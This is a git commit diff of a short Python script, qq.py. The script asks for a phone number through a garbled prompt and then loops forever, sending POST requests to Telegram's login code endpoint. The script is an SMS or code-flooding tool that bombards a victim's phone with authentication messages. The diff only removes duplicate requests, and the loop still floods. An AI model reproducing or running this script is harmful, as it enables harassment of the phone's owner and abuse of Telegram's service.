fdfd386706e4806e101d0ca17e622528dedb5113
Hironotori <81866681+Hironotori@users.noreply.github.com>
2022-01-24 10:52:54 +0200

    Update qq.py

--- qq.py
+++ qq.py
@@ -9,22 +9,7 @@ NUMBER = input('Beeante HOMep tenedona: (6es +)')
 while True:
  try:
      print('+')
-     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
- except:
-     print('=')
- try:
-     print('+')
      response = requests.post("https://my.telegram.org/auth/send_password", headers=headers, data={'phone': "+" + NUMBER})
- except:
-     print('=')
- try:
-     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
-     print('+')
- except:
-     print('=')
- try:
-     response = requests.post('https://my.telegram.org/auth/send_password', headers-headers, data={'phone' : NUMBER})
-     print('+')
  except:
      print('=')
      
